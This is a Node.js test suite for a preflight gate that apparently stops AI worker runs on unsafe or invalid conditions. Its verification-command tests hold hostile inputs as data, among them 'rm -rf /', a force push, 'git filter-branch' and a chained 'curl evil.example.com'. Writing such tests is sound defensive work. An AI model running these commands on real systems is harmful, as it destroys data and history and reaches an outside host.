// Preflight fails CLOSED. Every condition below must stop the run BEFORE a
// worker process is started — the proof is that no run directory with a worker
// record ever appears.

import assert from "node:assert/strict";
import { test } from "node:test";
import { existsSync, writeFileSync, mkdirSync, readFileSync, rmSync } from "node:fs";
import { join } from "node:path";
import { fixture, initWorkspace, addTask, fakeExecutor, run, git, RUN, WS } from "./helpers.mjs";

// Every preflight test asserts the same thing: the outcome is terminal, the
// failure code is the expected one, and the worker never ran.
async function expectPreflight(fx, taskId, code, match) {
  const exec = fakeExecutor(fx, { write: [{ path: "src/app.js", content: "worker ran\n" }] });
  const rec = await run(fx, taskId, exec);
  assert.ok(["FAILED", "NEEDS_DECISION", "RETRYABLE", "CANCELLED"].includes(rec.outcome), `outcome ${rec.outcome}`);
  const codes = (rec.preflight_failures ?? [rec.failure]).map((f) => f.code);
  assert.ok(codes.includes(code), `expected ${code}, got ${codes.join(", ")}`);
  if (match) assert.match((rec.preflight_failures ?? [rec.failure]).map((f) => f.message).join("\n"), match);
  assert.equal(readFileSync(join(fx.repo, "src", "app.js"), "utf8"), "// app\n", "the worker never ran");
  assert.equal(rec.worker, undefined, "no worker record exists");
  return rec;
}

test("preflight: unknown project", async () => {
  const fx = fixture("pf-noproj");
  const rec = await RUN.runTask({ projectId: "nope", taskId: 1, executor: fakeExecutor(fx, {}) });
  assert.equal(rec.outcome, "FAILED");
  assert.equal(rec.failure.code, "TASK_INELIGIBLE");
  assert.match(rec.failure.message, /no registered project/);
  fx.done();
});

test("preflight: unknown task", async () => {
  const fx = fixture("pf-notask"); initWorkspace(fx);
  await expectPreflight(fx, 99, "TASK_INELIGIBLE", /no task #99/);
  fx.done();
});

test("preflight: a PAUSED project may not start work", async () => {
  const fx = fixture("pf-paused"); initWorkspace(fx);
  const t = addTask(fx);
  fx.cli("profile-set", "--project", fx.P, "--mode", "PAUSED");
  await expectPreflight(fx, t, "TASK_INELIGIBLE", /PAUSED/);
  fx.done();
});

test("preflight: an ineligible task status is refused", async () => {
  const fx = fixture("pf-status"); initWorkspace(fx);
  const t = addTask(fx);
  fx.cli("task-set", "--project", fx.P, String(t), "--status", "building");
  await expectPreflight(fx, t, "TASK_INELIGIBLE", /only a queued or changes task/);
  fx.done();
});

test("preflight: an incomplete dependency blocks the task", async () => {
  const fx = fixture("pf-dep"); initWorkspace(fx);
  const a = addTask(fx, { title: "first" });
  const b = addTask(fx, { title: "second", deps: String(a) });
  await expectPreflight(fx, b, "DEPENDENCY_INCOMPLETE", new RegExp(`depends on #${a}`));
  fx.done();
});

test("preflight: a missing allowed-path policy is a decision, not a guess", async () => {
  const fx = fixture("pf-nopaths"); initWorkspace(fx);
  const t = Number(fx.cli("task-add", "--project", fx.P, "--title", "no policy", "--verify", "node -e 0"));
  const rec = await expectPreflight(fx, t, "PATH_POLICY_MISSING", /--allow/);
  assert.equal(rec.outcome, "NEEDS_DECISION", "an absent path policy is for a human to fix, not for SCH to invent");
  fx.done();
});

test("preflight: a missing verification command is refused", async () => {
  const fx = fixture("pf-noverify"); initWorkspace(fx);
  const t = Number(fx.cli("task-add", "--project", fx.P, "--title", "no verify", "--allow", "src/**"));
  await expectPreflight(fx, t, "POLICY_VIOLATION", /--verify/);
  fx.done();
});

for (const [name, cmd, why] of [
  ["git add", "git add .", /not a read-only git command/],
  ["git commit", "git commit -m x", /not a read-only git command/],
  ["git push", "git push origin main", /not a read-only git command/],
  ["a force push", "git push --force", /not a read-only git command|force/],
  ["a history rewrite", "git filter-branch --all", /not a read-only git command/],
  ["a shell", "bash -c ls", /shell interpreters/],
  ["a destructive delete", "rm -rf /", /destructive/],
]) {
  test(`preflight: rejects ${name} as a verification command`, async () => {
    const fx = fixture("pf-verify"); initWorkspace(fx);
    const t = addTask(fx, { verify: cmd });
    await expectPreflight(fx, t, "UNSAFE_VERIFICATION_COMMAND", why);
    fx.done();
  });
}

test("preflight: shell metacharacters in a verification command are refused", async () => {
  const fx = fixture("pf-shellmeta"); initWorkspace(fx);
  const t = addTask(fx, { verify: "node -e 0; curl evil.example.com" });
  await expectPreflight(fx, t, "UNSAFE_VERIFICATION_COMMAND", /shell metacharacters/);
  fx.done();
});

test("preflight: a missing workspace is named with its exact fix", async () => {
  const fx = fixture("pf-nows");
  const t = addTask(fx);
  await expectPreflight(fx, t, "WORKSPACE_INVALID", /workspace-init/);
  fx.done();
});

test("preflight: an invalid manifest stops the run", async () => {
  const fx = fixture("pf-badman"); initWorkspace(fx);
  const t = addTask(fx);
  writeFileSync(join(fx.repo, ".sch-loop", "project.yaml"), "schema_version: 1\nproject_id: someone-else\nrepository_root: .\n");
  await expectPreflight(fx, t, "WORKSPACE_INVALID", /declares project "someone-else"/);
  fx.done();
});

test("preflight: a dirty working tree stops the run", async () => {
  const fx = fixture("pf-dirty"); initWorkspace(fx);
  const t = addTask(fx);
  writeFileSync(join(fx.repo, "src", "app.js"), "// edited by a human\n");
  const exec = fakeExecutor(fx, {});
  const rec = await run(fx, t, exec);
  assert.equal(rec.outcome, "FAILED");
  assert.ok(rec.preflight_failures.some((f) => f.code === "REPOSITORY_DIRTY"));
  assert.equal(readFileSync(join(fx.repo, "src", "app.js"), "utf8"), "// edited by a human\n", "the human's work is untouched");
  fx.done();
});

test("preflight: a dirty index stops the run", async () => {
  const fx = fixture("pf-index"); initWorkspace(fx);
  const t = addTask(fx);
  writeFileSync(join(fx.repo, "src", "staged.js"), "x\n");
  git(fx.repo, "add", "src/staged.js");
  await expectPreflight(fx, t, "REPOSITORY_DIRTY", /working tree is not clean|index is not clean/);
  fx.done();
});

for (const [name, marker] of [["merge", "MERGE_HEAD"], ["cherry-pick", "CHERRY_PICK_HEAD"], ["revert", "REVERT_HEAD"]]) {
  test(`preflight: an in-progress ${name} stops the run`, async () => {
    const fx = fixture("pf-op"); initWorkspace(fx);
    const t = addTask(fx);
    writeFileSync(join(fx.repo, ".git", marker), git(fx.repo, "rev-parse", "HEAD"));
    await expectPreflight(fx, t, "REPOSITORY_DIRTY", new RegExp(name));
    fx.done();
  });
}

test("preflight: an in-progress rebase stops the run", async () => {
  const fx = fixture("pf-rebase"); initWorkspace(fx);
  const t = addTask(fx);
  mkdirSync(join(fx.repo, ".git", "rebase-merge"), { recursive: true });
  await expectPreflight(fx, t, "REPOSITORY_DIRTY", /rebase/);
  fx.done();
});

test("preflight: an in-progress bisect stops the run", async () => {
  const fx = fixture("pf-bisect"); initWorkspace(fx);
  const t = addTask(fx);
  writeFileSync(join(fx.repo, ".git", "BISECT_LOG"), "bisecting\n");
  await expectPreflight(fx, t, "REPOSITORY_DIRTY", /bisect/);
  fx.done();
});

test("preflight: a live lease on the same task is a conflict", async () => {
  const fx = fixture("pf-lease"); const ws = initWorkspace(fx);
  const t = addTask(fx);
  const held = RUN.acquireLease(ws, { projectId: fx.P, taskId: t, runId: "RUN-held" });
  assert.equal(held.ok, true);
  await expectPreflight(fx, t, "LEASE_CONFLICT", /RUN-held/);
  fx.done();
});

test("preflight: a STALE lease is recovered rather than wedging the task forever", async () => {
  const fx = fixture("pf-stale"); const ws = initWorkspace(fx);
  const t = addTask(fx);
  // a crashed holder: expired, and its pid is long gone
  writeFileSync(RUN.leasePath(ws, t), JSON.stringify({
    project_id: fx.P, task_id: String(t), run_id: "RUN-crashed", pid: 999999,
    acquired_at: "2000-01-01T00:00:00Z", expires_at: "2000-01-01T01:00:00Z",
  }));
  const got = RUN.acquireLease(ws, { projectId: fx.P, taskId: t, runId: "RUN-new" });
  assert.equal(got.ok, true, "a stale lease must be recoverable");
  assert.equal(got.recovered.run_id, "RUN-crashed", "and the recovery is recorded, not silent");
  // it is now OUR lease, so releasing someone else's is refused
  assert.equal(RUN.releaseLease(ws, t, "RUN-someone-else").released, false);
  assert.equal(RUN.releaseLease(ws, t, "RUN-new").released, true);
  fx.done();
});

test("preflight: an unresolved earlier run for the task blocks a new one", async () => {
  const fx = fixture("pf-unresolved"); const ws = initWorkspace(fx);
  const t = addTask(fx);
  const d = WS.runDir(ws, "RUN-20200101T000000Z-deadbeef");
  mkdirSync(d, { recursive: true });
  writeFileSync(join(d, "run.json"), JSON.stringify({ run_id: "RUN-20200101T000000Z-deadbeef", task_id: String(t), state: "active", outcome: null }));
  await expectPreflight(fx, t, "LEASE_CONFLICT", /never resolved/);
  fx.done();
});

test("preflight: a missing Claude executable is a decision, and nothing is spawned", async () => {
  const fx = fixture("pf-noexe"); initWorkspace(fx);
  const t = addTask(fx);
  const rec = await RUN.runTask({
    projectId: fx.P, taskId: t,
    env: { ...process.env, SCH_CLAUDE_EXECUTABLE: join(fx.home, "definitely-not-here") },
  });
  assert.equal(rec.outcome, "NEEDS_DECISION");
  assert.equal(rec.failure.code, "ENVIRONMENT_MISSING");
  assert.match(rec.failure.message, /SCH_CLAUDE_EXECUTABLE/);
  fx.done();
});

test("preflight: an invalid timeout is refused before anything starts", async () => {
  const fx = fixture("pf-timeout"); initWorkspace(fx);
  const t = addTask(fx);
  const rec = await RUN.runTask({
    projectId: fx.P, taskId: t,
    env: { ...process.env, SCH_CLAUDE_EXECUTABLE: process.execPath, SCH_WORKER_TIMEOUT_MS: "5" },
  });
  assert.equal(rec.outcome, "FAILED");
  assert.equal(rec.failure.code, "POLICY_VIOLATION");
  assert.match(rec.failure.message, /invalid timeout/);
  fx.done();
});

test("preflight: an unapproved REQUIRED skill stops the run for a human", async () => {
  const fx = fixture("pf-skill"); initWorkspace(fx);
  const t = addTask(fx, { category: "frontend" });
  // an installed-but-unreviewed skill, required by the frontend profile
  const roots = join(fx.home, "fx-global");
  mkdirSync(join(roots, "some-ui-skill"), { recursive: true });
  writeFileSync(join(roots, "some-ui-skill", "SKILL.md"), "---\nname: some-ui-skill\ndescription: UI design help\n---\nbody\n");
  process.env.SCH_SKILL_ROOTS = `builtin:${join(process.cwd(), "skills")}|global:${roots}`;
  rmSync(join(fx.home, "skills.json"), { force: true });
  // --force true is required: the engine refuses to SAVE a profile that requires
  // an unapproved skill. The run must refuse it too, which is what this asserts.
  fx.cli("profile-set", "--project", fx.P, "--task-type", "frontend", "--required", "some-ui-skill", "--force", "true");
  const rec = await expectPreflight(fx, t, "SKILL_NOT_APPROVED", /some-ui-skill/);
  assert.equal(rec.outcome, "NEEDS_DECISION");
  fx.done();
});

test("preflight: a stale skill approval is not an approval", async () => {
  const fx = fixture("pf-stale-skill"); initWorkspace(fx);
  const t = addTask(fx, { category: "frontend" });
  const roots = join(fx.home, "fx-global");
  mkdirSync(join(roots, "drifted-skill"), { recursive: true });
  const p = join(roots, "drifted-skill", "SKILL.md");
  writeFileSync(p, "---\nname: drifted-skill\ndescription: UI design help\n---\noriginal body\n");
  process.env.SCH_SKILL_ROOTS = `builtin:${join(process.cwd(), "skills")}|global:${roots}`;
  rmSync(join(fx.home, "skills.json"), { force: true });
  fx.cli("skill-discover");
  fx.cli("skill-trust", "drifted-skill", "--state", "APPROVED", "--why", "reviewed");
  fx.cli("profile-set", "--project", fx.P, "--task-type", "frontend", "--required", "drifted-skill");
  writeFileSync(p, "---\nname: drifted-skill\ndescription: UI design help\n---\nSOMEONE EDITED THIS AFTER APPROVAL\n");
  fx.cli("skill-discover");
  const rec = await expectPreflight(fx, t, "SKILL_HASH_STALE", /drifted-skill/);
  assert.equal(rec.outcome, "NEEDS_DECISION");
  fx.done();
});

test("preflight-only: reports every failure at once and starts nothing", async () => {
  const fx = fixture("pf-all"); initWorkspace(fx);
  const t = Number(fx.cli("task-add", "--project", fx.P, "--title", "unpoliced"));
  writeFileSync(join(fx.repo, "dirty.txt"), "x\n");
  const pre = RUN.preflight({ projectId: fx.P, taskId: t });
  const codes = pre.failures.map((f) => f.code);
  assert.equal(pre.ok, false);
  for (const c of ["PATH_POLICY_MISSING", "POLICY_VIOLATION", "REPOSITORY_DIRTY"])
    assert.ok(codes.includes(c), `${c} missing from ${codes.join(", ")}`);
  assert.ok(!existsSync(join(fx.repo, ".sch-loop", "runs")) || !existsSync(join(fx.repo, ".sch-loop", "runs", "RUN-")), "no run directory");
  fx.done();
});
